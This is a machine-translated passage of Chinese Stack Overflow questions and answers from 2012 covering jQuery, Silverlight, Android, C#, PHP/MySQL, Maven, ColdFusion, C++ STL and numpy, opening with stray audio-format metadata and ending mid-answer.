格式 ID：lpcm

格式标志：3116

每个数据包的字节数：4

每包帧数：1

每帧字节数：4

每帧通道数：1

每通道位数：32

# javascript - firefox val() 设置错误值，删除一个空格

> ID：13572412
> 
> 赞同：1
> 
> 时间：2012-11-26T20:14:50.963
> 
> 标签：javascript, jquery, cross-browser

我有一个 ajax 代码，并且在成功时我有这个代码：

```
//success
    alert(data.now);    //1
    alert($('#myTextArea').val());    //2
    $('#myTextbox').val(data.now);
    alert(data.now);    //3
    alert($('#myTextArea').val());    //4 
```

`//1`警告此文本：

```
'<p>hello how  are you </p><p>tnx im fine</p>' 
```

（“如何”和“是”之间有两个空格）

`//2`警告空字符串。我`textarea`的还是空的。

`//3`警告此文本：

```
'<p>hello how  are you</p><p>tnx im fine</p>' 
```

（“如何”和“是”之间有两个空格）

`//4`：

```
'<p>hello how are you</p><p>tnx im fine</p>' 
```

只有一个空位。

可能是什么问题？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-26T20:19:40.990

使用 css`white-space`样式保留元素内的空白。

[https://developer.mozilla.org/en-US/docs/CSS/white-space](https://developer.mozilla.org/en-US/docs/CSS/white-space)

```
 .my_element {
    white-space: pre; /* or other pre- styles*/
  } 
```

**演示：http:** [//jsfiddle.net/5UWFB/2/](http://jsfiddle.net/5UWFB/2/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T20:15:26.780

用“\u00a0”替换空格解决了我的问题。用“”替换它们在控制台中有效，但在我的程序中无效。

# silverlight - 如何将一个控件放置在源自 XAML 中另一个控件的标注中？

> ID：13572413
> 
> 赞同：1
> 
> 时间：2012-11-26T20:14:51.413
> 
> 标签：silverlight, xaml, user-interface, positioning

这是一个设置：我有一个带有数字值的文本框。根据要求，每次任何人更改该值时都需要提供随附的评论。因此，在视觉上必须有另一个文本框用于注释，应该显示在第一个文本框旁边。理想情况下，注释文本框需要放置在源自值文本框的标注中，并显示在它的右侧，覆盖它下面的任何内容，就像这张图片一样：![在此处输入图像描述](../Images/33aa37d85b0749016168c5b84926f20b.png)

我知道如何在 CSS 和 HTML 中轻松做到这一点。我现在必须在 Silverlight 中做同样的事情。不幸的是，我在这方面不是很强大，所以我特别要问的是如何让 2 个文本框使其中一个出现在另一个旁边（在右侧覆盖它下面的任何控件），并尽可能少地使用 XAML 和代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T14:46:34.123

好的，我最终写下了我自己的行为

```
namespace MyNamespace
{
    public class CommentBehavior : Behavior<TextBox>
    {
        private readonly TimeSpan howLongWeWaitBeforePopupCloses = TimeSpan.FromMilliseconds(200);

        private DispatcherTimer popupClosingTimer;
        public static DependencyProperty PopupProperty = DependencyProperty.Register("Popup", typeof(Popup), typeof(CommentBehavior), new PropertyMetadata(null));

        public Popup Popup
        {
            get { return (Popup)this.GetValue(PopupProperty); }
            set { this.SetValue(PopupProperty, value); }
        }

        protected override void OnAttached()
        {
            this.popupClosingTimer = new DispatcherTimer();
            this.popupClosingTimer.Stop();
            this.popupClosingTimer.Interval = howLongWeWaitBeforePopupCloses;
            this.popupClosingTimer.Tick += this.ClosePopup;
            this.AssociatedObject.GotFocus += this.GotFocus;
            this.AssociatedObject.LostFocus += this.LostFocus;
            this.Popup.Child.GotFocus += PopupChild_GotFocus;
            this.Popup.Child.LostFocus += PopupChild_LostFocus;
        }

        private void PopupChild_LostFocus(object sender, RoutedEventArgs e)
        {
            this.popupClosingTimer.Start();
        }

        private void PopupChild_GotFocus(object sender, RoutedEventArgs e)
        {
            this.popupClosingTimer.Stop();
        }

        protected override void OnDetaching()
        {
            this.AssociatedObject.GotFocus -= this.GotFocus;
            this.AssociatedObject.LostFocus -= this.LostFocus;
            this.Popup.GotFocus -= PopupChild_GotFocus;
            this.popupClosingTimer.Tick -= this.ClosePopup;
            this.popupClosingTimer = null;
        }

        private void ClosePopup(object sender, EventArgs e)
        {
            this.Popup.IsOpen = false;
            this.popupClosingTimer.Stop();
        }

        protected void GotFocus(object sender, RoutedEventArgs e)
        {
            this.popupClosingTimer.Stop();
            this.Popup.IsOpen = true;
            var at = this.CalculatePopupPosition();
            this.Popup.HorizontalOffset = at.X;
            this.Popup.VerticalOffset = at.Y;
        }

        private Point CalculatePopupPosition()
        {
            var owner = this.AssociatedObject;
            var transformation = owner.TransformToVisual(Application.Current.RootVisual);
            var at = transformation.Transform(new Point(owner.ActualWidth, 0));
            return at;
        }

        protected void LostFocus(object sender, RoutedEventArgs e)
        {
            this.popupClosingTimer.Start();
        }
    }
} 
```

以及以下 XAML

```
<Grid x:Name="LayoutRoot" Background="White">
    <Grid.RowDefinitions>
        <RowDefinition Height="Auto" />
    </Grid.RowDefinitions>

    <StackPanel Grid.Row="0" Background="Red">
        <TextBox Width="200" Text="0.01">
            <i:Interaction.Behaviors>
                <local:CommentBehavior>
                    <local:CommentBehavior.Popup>
                        <Popup>
                            <TextBox Text="Comment" />
                        </Popup>
                    </local:CommentBehavior.Popup>
                </local:CommentBehavior>
            </i:Interaction.Behaviors>
        </TextBox>
    </StackPanel>

</Grid> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:56:41.797

使用 a`ToolTip`并设置 Placement 使其显示在右侧。在 XAML 中，您可以将模板化为`ToolTip`您想要的外观，即使这意味着模仿`TextBox`外观。

这是 的目的`ToolTip`，我强烈认为您应该始终使用正确的工具来完成正确的工作。:)

我希望这有帮助。如果您需要代码示例，请告诉我们。

编辑：添加了以下代码示例：

```
 <TextBox ToolTipService.Placement="Right">
        <ToolTipService.ToolTip>
            <TextBox Text="{Binding CalloutText, Mode=OneWay}" IsReadOnly="True"/>
        </ToolTipService.ToolTip>
    </TextBox> 
```

# java - 摩托罗拉 Xoom 是否有绘图错误，还是只有我一个？

> ID：13572423
> 
> 赞同：4
> 
> 时间：2012-11-26T20:15:28.117
> 
> 标签：java, android

我开发了一个小游戏，我的一个朋友/同事在他的摩托罗拉 Xoom 平板电脑上试了一下，结果发现渲染一团糟！我剥离了所有内容，试图简化所有内容以查看问题所在，并且我认为摩托罗拉 Xoom 在绘图方面只是有问题。两者都使用完全相同的 APK，具有完全相同的绘图代码。我有一个自定义视图，它现在正在绘制一个黑色矩形，如下所示：

```
@Override
public void draw(Canvas canvas) {
    super.draw(canvas);

    canvas.save();
    canvas.scale(16.0f, 16.0f);
    float lineWidth = 20 / 16.0f;

    paint.setAntiAlias(false);
    paint.setStyle(Paint.Style.STROKE);
    paint.setStrokeWidth(lineWidth);
    paint.setColor(boardColor); // boardColor is just black
    canvas.drawRect(100 / 16.0f,
                    100 / 16.0f,
                    200 / 16.0f,
                    200 / 16.0f,
                    paint);

    canvas.restore();
} 
```

在我的 Sprint Galaxy SII，Android 4.0.4 上，我得到（我也在 Galaxy SIII 设备上得到这个）： ![银河 SII 截图](../Images/895b531a1ca640644ba95918a2f43208.png)

在我朋友的摩托罗拉 Xoom，Android 4.1.2 上，我得到： ![摩托罗拉 Xoom 截图](../Images/b186c138b7ce46f4e35a40b2a91c5732.png)

我想要的只是一个大小正确、没有抗锯齿的矩形。我究竟做错了什么？还是Xoom？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T20:53:10.243

[看起来这确实是 Xoom 中的一个错误（或者可能是 Android），并且已在 Android 4.2 中修复](https://forums.motorola.com/posts/abe5b1e6b4?commentId=686537#686537)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:36:51.943

你的缩放发生了一些奇怪的事情。如果我取出 canvas.scale() 并删除矩形中的所有“/16.0f”，那么矩形看起来就好了。有了这些，我可以确认我的 xoom 显示了来自你朋友 xoom 的奇怪矩形。

因此，您需要找出一种不同的方法来缩放形状。

```
mPixelsInOneDp = TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 1,
            res.getDisplayMetrics()); 
```

我使用“mPixelsInOneDp”来确保我的所有测量结果以及在不同设备上的 DP 中最终结果是相同的。我在缩放方面没有任何问题，所以我认为最后你需要调整你的数字，直到在 xoom 上看起来不错。

# c# - 在 HTML 标记中使用 System.Drawing.Image

> ID：13572424
> 
> 赞同：3
> 
> 时间：2012-11-26T20:15:36.043
> 
> 标签：c#, html, system.drawing

我有一个可能很简单的问题。我将图像存储在数据库中，然后在我的应用程序中使用 C# 方法获取该图像并将其存储在如下所示的自定义类中：

```
public class MyImage
{
 public System.Drawing.Image myImageFromDB;
 public string imageName;
 public int imageNumberInCollection;
} 
```

我的问题是：我可以/如何在 HTML 图像标签中使用此类中的图像吗？我尝试了以下操作，但它只返回一个带有红色 X 的框：

```
//myImageFromDBCollection is a list of MyImage objects
foreach(var ind in myImagesFromDBCollection)
{
  table += String.Format("<image src={0} />", ind.myImageFromDB);
} 
```

关于我做错了什么的任何想法？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-26T21:09:54.290

我最终选择了 Brads Method 来解决这个问题（请参阅问题下的评论）我最终创建了一个方法，该方法接受 System.Drawing.Image 并将其转换为字节数组，然后对该字节数组进行编码以获取图像。代码如下所示：

```
byte[] imgBytes = turnImageToByteArray(ind.ind.myImageFromDB);
string imgString = Convert.ToBase64String(imgBytes);
table += String.Format("img src=\"data:image/Bmp;base64,{0}\">", imgString);

private byte[] turnImageToByteArray(System.Drawing.Image img)
{
  MemoryStream ms = new MemoryStream();
  img.Save(ms, System.Drawing.Imaging.ImageFormat.Bmp);
  return ms.ToArray();
} 
```

目前，这适用于我的目的，所以感谢大家和他们的建议，尽管每个人都会来帮助:-)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-26T20:27:08.070

可以使用通用处理程序（ashx 文件）提供图像：

```
public class StickerHandler : IHttpHandler
{

    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "image/png";
        context.Response.Cache.SetCacheability(HttpCacheability.Public);
        context.Response.BufferOutput = false;

        //TODO: link your MyImage to iSource using imageId query parameter...
        Image iSource = null;
        MemoryStream ms = new MemoryStream();
        iSource.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
        byte[] data = ms.ToArray();
        ms.Dispose();
        g.Flush();
        g.Dispose();
        iSource.Dispose();

        context.Response.BinaryWrite(data);
    }

    public bool IsReusable
    {
        get
        {
            return true;
        }
    }

} 
```

可以在此处找到有关通用处理程序的更多信息：

[http://msdn.microsoft.com/en-us/library/bb398986(v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/bb398986(v=vs.100).aspx)

在您的图像中：

```
<img src='StickerHandler.ashx?img=imageId' /> 
```

快乐编码！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-26T20:20:04.093

如果我是你，我会将图像文件保存在磁盘上，并且只在你的数据库中保存图像文件名。

如果您的图像格式有问题，请查看您的来源并确保它是正确的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-26T20:26:43.097

如果您必须将图像存储在数据库中，查看它们的一种简单方法是使用图像处理程序。

基本上，您可以创建一个`ASHX`处理程序，它接受一个查询字符串，即数据库中的图像 ID，并返回图像内容以及正确的 mime 类型。这在 C# 中非常简单。

然后，您可以将`<img />`标记指向具有指定 ID 的处理程序。就像是

```
table += String.Format("<image src='/ViewImage.ashx?id={0}' />", ind.myImageId); 
```

[](http://www.developerfusion.com/code/5223/using-ashx-files-to-retrieve-db-images/)****这是一个让您入门**[**的基本教程。**](http://www.developerfusion.com/code/5223/using-ashx-files-to-retrieve-db-images/)**

 *****一个常见的性能改进是将图像缓存在处理程序中的磁盘上。*****

# c# - 生成的命名空间 POCO 类

> ID：13572427
> 
> 赞同：1
> 
> 时间：2012-11-26T20:15:47.977
> 
> 标签：c#, entity-framework, edmx

（*我觉得我在这里遗漏了一些重要的东西。*）

我正在为实体使用“数据库优先”方法创建 WCF 数据服务 (5.0)。

我使用（*点）创建了带有“**命名空间*”名称的表，例如and 。`.`*`[Entertainment.Event]``[Promotions.Event]`*

 *EF 4.x POCO 生成器模板当然会通过调用`CSharpCodeProvider.CreateEscapedIdentifier()`.

我非常想生成（*并重新生成，并适当地映射*）**命名空间 POCO**；具体来说，保留表的隐含命名空间。

就实现这一点而言，我在看什么？我猜这将涉及一段时间的 T4 模板游泳。

最终，这可行吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:40:35.193

我建议为每个数据库模式创建一个上下文，将每个上下文放置到您喜欢的任何名称空间中。*

# php - 使用php多次插入mysql

> ID：13572428
> 
> 赞同：0
> 
> 时间：2012-11-26T20:15:48.050
> 
> 标签：php, mysql, loops, multiple-insert

我有一个脚本，当有人输入他们的电子邮件时，它会插入公司 ID、用户 ID 和交易的日期时间。现在我必须添加一个下拉选择框，允许用户选择他们想要捐赠的数量，因此只需输入他们的电子邮件地址一次。解决此问题的最佳方法是什么？我在想这样的事情：

```
$coid = $row['companyid'];
$userid = $_SESSION['userid'];
$selectbox = $_POST['select']; // number value 1-10

// old query
mysql_query = ("INSERT INTO donations(company, user)");

// new query
$i=1
while($i<=$selectbox) {
mysql_query = ("INSERT INTO donations(company, user)");
$i++
} 
```

或类似的规定。这是最好的方法吗？更好的方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:21:18.357

首先，停止使用`mysql_`函数，因为它们已[被弃用](http://www.deprecatedphp.com/mysql)。改用`mysqli_`or`PDO`函数。

您应该使用准备好的语句或清理变量以防止 SQL 注入。

关于更好的方法，您可以将它们放入一个数组中，然后在执行时内爆。[这](https://stackoverflow.com/a/2098689)是一个很好的起点。它使用 PDO 插入一个数组。

使用您当前的代码，我不清楚您如何跟踪希望进行捐赠的用户数量，但您可以执行以下操作：

```
$i = 1;
while($i <= $selectbox) {
$insertArray[] = "$coid, $userid";
$i++;
}

mysql_query("INSERT INTO donations (company, user) VALUES (" . implode('), (', $insertArray) . ")"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:55:22.720

您应该制作一个包含 3 列的数据库表（对于这个问题）。

我会给你制作所需表格的代码，只需将其复制并粘贴到 PHPmyAdmin 中：

```
Create Table donations(
company_id int,
user_id int,
donate_num int,
datetime DATETIME
) 
```

然后使用该`INSERT INTO`函数使用新的 mysqli 函数更新数据库（将服务器/用户名等替换为您的数据库详细信息）：

```
$mysqli= new mysqli('SERVER','USERNAME','PASSWORD','DATABASE NAME')
if ($mysqli->connect_error) {
            die('Connect Error (' . $mysqli->connect_errno . ') '
                    . $mysqli->connect_error);
        }

function escapeStringSlash($value) {

            global $mysqli;
           if (get_magic_quotes_gpc()) {
               $value = stripslashes($value);
           }

           if (!is_numeric($value)) {
               $value = $mysqli->real_escape_string($value);
           }
           return $value;
        }

$coid=escapeStringSlash($row['companyid']);
$userid = escapeStringSlash($_SESSION['userid']);
$selectbox = escapeStringSlash($_POST['select']);
$date = new DateTime();
$currentTime = $date->format("Y-m-d H:i:s");

if($insertDonations=$mysqli->query("INSERT INTO donations(company_id,user_id,donate_num,datetime) VALUES(".$coid.",".$userid.",".$selectbox.",'".$currentTime."')"){
echo "Number of donations received";
}else{
echo "There was a problem inserting this.";
}
$mysqli->close(); 
```

# c# - 使用 asx 文件或制作新的播放列表？

> ID：13572431
> 
> 赞同：0
> 
> 时间：2012-11-26T20:16:00.880
> 
> 标签：c#, .net, axwindowsmediaplayer, asx

我的`.asx`文件包含：

```
<ASX Version="3">
<TITLE>Super FM 104,8 - NICOSIA</TITLE>
<ABSTRACT>Powered by OneStreaming.com</ABSTRACT>
<ENTRY>
<REF HREF = "http://golive.onestreaming.com/super"/>
<REF HREF = "mms://golive.onestreaming.com/super"/>
<REF HREF = "http://live.onestreaming.com/super"/>
<REF HREF = "mms://live.onestreaming.com/super"/>
</ENTRY>
</ASX> 
```

`axwindowsmediaplayer`如果一个不起作用，我想让播放成为下一个链接。

所以我的问题是......如果我放`axwindowsmediaplayer.URL = " .../SuperFM.asx`了它会在一个不工作的情况下播放下一个链接，还是最好将这些链接添加到播放列表来做到这一点？

注意：请不要开始投反对票...如果您需要更好的解释，请询问...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:48:21.107

我找到了......对于那些有同样问题的人......

`axwindowsmediaplayer`可以播放`.asx`文件，如果`.asx`文件有多个链接，假设第一个链接不起作用，它会自动转到下一个链接，所以你不需要制作播放列表，这将是同样的事情，但更多的编码.. .

# maven - 在maven中创建多模块项目

> ID：13572437
> 
> 赞同：0
> 
> 时间：2012-11-26T20:16:29.227
> 
> 标签：maven, multi-module

我想用 maven 创建多模块独立应用程序。

就我而言，我想让'Loader'项目（.jar）包含所有其他项目。但现在我只有一组 .jar 文件（loader.jar、 crawler1.jar ...等）

*装载机的 .pom*：

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.javanix.jmetalcrawler</groupId>
    <artifactId>loader</artifactId>
    <version>1.0</version>

    <build>
        <pluginManagement>
            <plugins>
                <plugin>
                    <groupId>org.apache.maven.plugins</groupId>
                    <artifactId>maven-compiler-plugin</artifactId>
                    <configuration>
                        <source>1.6</source>
                        <target>1.6</target>
                    </configuration>
                </plugin>
            </plugins>
        </pluginManagement>
    </build>

</project> 
```

*子项目的 .pom*：

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">

    <modelVersion>4.0.0</modelVersion>

    <groupId>com.javanix.jmetalcrawler</groupId>
    <artifactId>Crawler-1</artifactId>
    <version>1.0</version>

    <dependencies>
        <dependency>
            <groupId>com.javanix.jmetalcrawler</groupId>
            <artifactId>loader</artifactId>
            <version>1.0</version>
        </dependency>
    </dependencies>

    <build>
        <pluginManagement>
            <plugins>
                <plugin>
                    <groupId>org.apache.maven.plugins</groupId>
                    <artifactId>maven-compiler-plugin</artifactId>
                    <configuration>
                        <source>1.6</source>
                        <target>1.6</target>
                    </configuration>
                </plugin>
            </plugins>
        </pluginManagement>
    </build>

</project> 
```

*父母的 .pom*：

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">

    <modelVersion>4.0.0</modelVersion>

    <groupId>com.javanix.jmetalcrawler</groupId>
    <artifactId>parent</artifactId>
    <version>1.0</version>
    <packaging>pom</packaging>
    <name>jMetalCrawler</name>

    <modules>
        <module>Crawler-1</module>
        <module>Loader</module>
    </modules>

</project> 
```

**生命周期**：

1.  编译'Loader'（有接口/抽象类）
2.  编译/打包'crawler1'（因为它取决于'Loader'项目）
3.  编译/打包'crawler2'（因为它取决于'Loader'项目）
4.  带有已编译“爬虫”项目的包加载器

**PS**：

1.  感谢 Adrian Shum ，他提出了一个让我的项目更清晰的想法
2.  在“启动器”项目中重组我的项目后，我们可以通过`maven-assembly-plugin`（@see [http://rombertw.wordpress.com/2010/05/14/maven-recipe-building-an-aggregate-jar/](http://rombertw.wordpress.com/2010/05/14/maven-recipe-building-an-aggregate-jar/)）添加依赖项

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-27T07:32:10.857

我建议这样的项目结构：

```
loader  (POM, multi-module)
  + loader-api  (JAR)
  + crawler1    (JAR, depends on loader-api)
  + crawler2    (JAR, depends on loader-api)
  + loader-app  (JAR, depends on loader-api, crawler1, crawler2\.  
                 The standalone app is built here) 
```

通过拆分爬虫依赖的API和应用程序本身，整个项目结构更易于管理。而且，它也更加模块化，因为我们不再将 API 与应用程序混合

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:27:58.960

如果您所说的“使用 maven 的多模块独立应用程序”是指包含其所有依赖项的自包含、可执行 jar，那么[onejar-maven-plugin](http://code.google.com/p/onejar-maven-plugin/)可能就是您要寻找的。有关使用示例，请参阅[文档](http://onejar-maven-plugin.googlecode.com/svn/mavensite/usage.html)。

# mysql - 如何在 MySQL 中将时间格式化为“2:34 小时”、“0:34 小时”等

> ID：13572439
> 
> 赞同：0
> 
> 时间：2012-11-26T20:16:43.950
> 
> 标签：mysql, database, time

我正在编写一个查询，它选择两次并计算它们之间的差异，其中一个是开始，另一个是结束以找出持续时间。但是，两者都在 mysql 中设置为 TIME 类型。如何格式化时间而不是将 HH:MM:SS 显示为 '[OPTIONAL H]H':MM hrs'

我使用提取功能吗？我想我必须将 TIMEDIFF 包裹在其他东西上？

我的sql代码如下：

```
SELECT operator_no, log_in_time, TIMEDIFF(log_in_time,log_out_time) AS Duration 
```

非常感谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:25:56.867

Yes, wrap it in `TIME_FORMAT()`:

```
SELECT operator_no, log_in_time,
       TIME_FORMAT(
           TIMEDIFF(log_in_time, log_out_time),
           '%H:%i hrs'
       ) AS Duration 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:43:34.427

这也行不通吗？

SELECT operator_no, log_in_time, CONCAT(EXTRACT(HOUR_MINUTE FROM TIMEDIFF (log_in_time,end_time)) + 'hrs' ) AS Duration

# php - 问题更新到数据库 - 白屏

> ID：13572440
> 
> 赞同：1
> 
> 时间：2012-11-26T20:16:45.253
> 
> 标签：php, mysql

我正在尝试运行以下脚本，即使打开了错误报告，它也只是给我一个白屏，我已经浏览了代码，似乎找不到任何问题，但后来我只使用了 PHP几个月，所以我不是最有经验的，非常感谢您的帮助。

代码如下...

```
 <?php

error_reporting(E_ALL & ~E_NOTICE);
ini_set('display_errors', TRUE);
ini_set('display_startup_errors', TRUE);

ob_start();

function isLoggedIn()
{
    if(isset($_SESSION['valid']) && $_SESSION['valid'])
        return true;
    return false;
}

session_start();
//if the user has not logged in
if(!isLoggedIn())
{
    header('Location: ../main');

    die();
}

//! Get info from POST
$cat_name = $_POST['cat_name'];
$sub_cat_name = $_POST['sub_cat_name'];
$sub_cat_link = $_POST['sub_cat_link'];
$item_name = $_POST['item_name'];
$sub_cat_link_item = $_POST['sub_cat_link_item'];
$item_price = $_POST['item_price'];
$item_desc = $_POST['item_desk'];
$item_link = $_POST['item_link'];
$ID = $_POST['ID'];

if (isset($ID)) {

//! security real escape

$cat_name = mysql_real_escape_string($cat_name);
$sub_cat_name = mysql_real_escape_string($sub_cat_name);
$item_name = mysql_real_escape_string($item_name);
$sub_cat_link = mysql_real_escape_string($sub_cat_link);
$sub_cat_link_item = mysql_real_escape_string($sub_cat_link_item);
$item_price = mysql_real_escape_string($item_price);
$item_desc = mysql_real_escape_string($item_desc);
$item_link = mysql_real_escape_string($item_link);
$ID = mysql_real_escape_string($ID);

//! Connect to the database

require_once('../Connections/PropSuite.php');
mysql_select_db($database_Takeaway, $Takeaway);

//! Write the information to the database

$query = "UPDATE menu_cats
            SET category_name = '$cat_name',
                sub_cat_name = '$sub_cat_name',
                item_name = '$item_name',
                sub_cat_id_link = '$sub_cat_link',
                sub_cat_id = '$sub_cat_link_item',
                item_price = '$item_price',
                item_desc = '$item_desc',
                item_link_id = '$item_link'

            WHERE id = $ID ;"
mysql_query($query);

    if( mysql_errno() != 0){
     // mysql error
     // note: message like this should never appear to user, should be only stored in log
     echo "Mysql error: " . htmlspecialchars( mysql_error());
     die();
}

else {

header('Location: ../main/menu-manager.php?success');

}
}

else
{
echo("An error occurred!")
}
mysql_close();

?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:19:48.893

```
 WHERE id = $ID ;"
mysql_query($query); 
```

应该：

```
 WHERE id = $ID ";
mysql_query($query); 
```

并且缺少一个分号：

```
echo("An error occurred!") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:24:05.917

You Turn on output buffering and never output the buffer. Hence a blank page.

# coldfusion - Coldfusion 和 wsdl 数据类型

> ID：13572441
> 
> 赞同：0
> 
> 时间：2012-11-26T20:16:50.123
> 
> 标签：coldfusion, wsdl, coldfusion-9

我正在尝试使用带有冷融合 9 的 wsdl，但每次尝试调用函数时，都会收到 AxisFault 内部服务器错误。我认为错误是由于 wsdl 想要数据类型和冷融合没有正确转换它们，比如“dateTime”或类似的东西

```
<xs:element name="MaximumNumberOfMatches" minOccurs="0">
    <xs:simpleType>
        <xs:restriction base="xs:positiveInteger">
            <xs:maxInclusive value="10"/>
        </xs:restriction>
    </xs:simpleType>
</xs:element> 
```

有没有办法解决这个问题，因为似乎使用 javaCast 并没有完成工作。

为了传递日期时间，我发现这段代码可以工作

```
myJavaDate = CreateObject("java", "java.util.GregorianCalendar").getInstance();
myJavaDate.setTimeInMillis(0); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T21:35:34.963

我记得在 CF8 中遇到了[PositiveInteger 的问题。](http://ws.apache.org/axis/java/apiDocs/org/apache/axis/types/PositiveInteger.html)CF9 中的情况可能发生了变化，但当时创建该类的实例似乎是唯一可行的方法：

```
 num = createObject("java", "org.apache.axis.types.PositiveInteger").init(123); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-26T21:29:46.527

我要做的第一件事是修剪你的 xml。通常，前导空格会导致问题。

```
<cfhttp method = "get"...>
<cfset myXML = trim(cfhttp.FileContent)> 
```

您是此服务的所有者还是您无法控制？我唯一一次遇到此错误是在创建 wsdl 输出时出现问题。服务器配置更改，cfc 被炸毁。

高温高压

PS实际的错误会有所帮助。

# c++ - 具有特殊订购的独特 STL 容器

> ID：13572444
> 
> 赞同：4
> 
> 时间：2012-11-26T20:16:56.727
> 
> 标签：c++, stl, containers

我需要一个 STL 容器，它能够：

**1) 只存储独特的物品**

**2) 根据项目添加到容器的时间有保证的顺序**

所以，如果我按顺序将项目 A、B 和 C 添加到我的容器中，

**A**将始终可通过以下方式访问：`myItems().begin()`或`myItems[0]`

**B**将始终可通过以下方式访问： `myItems.begin() + 1`或`myItems[1]`

**C**将始终可通过以下方式访问： `myItems.begin() + 2`或`myItems[2]`

我目前正在使用`unordered_set`不满足需求#2 的。如果我使用常规`set`，我可以为排序指定小于函数，但随着新项目添加到容器中，排序可能会发生变化。

使用常规`set`，如果我插入一个小于 A 的新项目 D，则 A 将不再可以通过`myItems.begin()`. 我可能是错的，但这是我对集合排序如何工作的理解。

如果我使用 a ，我可以通过在插入每个新项目后`list`调用来强制执行唯一方面：`list::unique()`

```
myList.sort();
myList.unique(); 
```

或者我可以使用`std::find`列表或向量并手动强制执行独特的方面：

```
iter = std::find(myList.begin(), myList.end(), item);

//Only add item if not already in list/vector...
if(iter == myList.end())
{
    myList.push_back(item);
} 
```

是否有更好的容器/解决方案满足我的特殊需求？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T20:21:19.667

STL 中没有这样的容器，尽管您可以通过混合一个`std::set`/ `std::unordered_set`（检查唯一性）和一个`std::deque`（或任何其他序列容器）进行排序来使用现有容器实现一个。

Boost 有多索引容器，如果您可以使用它并想看看，它已经为您完成了这项工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:40:31.217

在这种情况下，我更喜欢使用**std::vector**或**std::deque**。**std::list**不是好的解决方案，因为您需要按索引访问元素（列表在此操作中具有 O(n) 复杂性）。**对于索引访问， std::deque**可能比 vector 慢一些，因为它使用块管理内存。但是，如果你有频繁/分散的插入，双端队列会更好。

如果您需要保留添加元素的顺序，则不能进行**排序/唯一**；所以这个任务需要唯一性约束，可以使用**std::set**或**unordered_map**来完成。

# php - 显示变量恰好是其他变量的 3 倍

> ID：13572446
> 
> 赞同：-4
> 
> 时间：2012-11-26T20:16:58.823
> 
> 标签：php, function, variables

```
$first = "Text 1"  
$second = "Text 2"  
$third = "Text 3"  
$fourth = "Text 4"  
$fifth = "Text 5" 
```

我想创建一个函数，它显示 $second 和 $fourth 的频率是其他变量的 3 倍。

这个怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:22:05.967

```
$arr = array($first, $second, $second, $second, $third, $fourth, $fourth, $fourth, $fifth);
$elem = $arr[array_rand($arr)]; 
```

这将从数字变为变量的值

# python - 用列表的值替换 numpy 索引数组的值

> ID：13572448
> 
> 赞同：25
> 
> 时间：2012-11-26T20:17:17.487
> 
> 标签：python, numpy, indexing

假设你有一个 numpy 数组和一个列表：

```
>>> a = np.array([1,2,2,1]).reshape(2,2)
>>> a
array([[1, 2],
       [2, 1]])
>>> b = [0, 10] 
```

我想替换数组中的值，以便将 1 替换为 0，将 2 替换为 10。

我在这里发现了一个类似的问题 - [http://mail.python.org/pipermail//tutor/2011-September/085392.html](http://mail.python.org/pipermail//tutor/2011-September/085392.html)

但是使用这个解决方案：

```
for x in np.nditer(a):
    if x==1:
        x[...]=x=0
    elif x==2:
        x[...]=x=10 
```

给我一个错误：

```
ValueError: assignment destination is read-only 
```

我想那是因为我不能真正写入一个 numpy 数组。

PS numpy 数组的实际大小为 514 x 504，列表为 8。

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-11-26T20:19:31.093

好吧，我想你需要的是

```
a[a==2] = 10 #replace all 2's with 10's 
```

* * *

## 回答 #2

> 赞同：25
> 
> 时间：2015-10-29T10:05:51.390

numpy 中的只读数组可以写成可写的：

```
nArray.flags.writeable = True 
```

这将允许像这样的赋值操作：

```
nArray[nArray == 10] = 9999 # replace all 10's with 9999's 
```

真正的问题不是赋值本身，而是可写标志。

* * *

## 回答 #3

> 赞同：24
> 
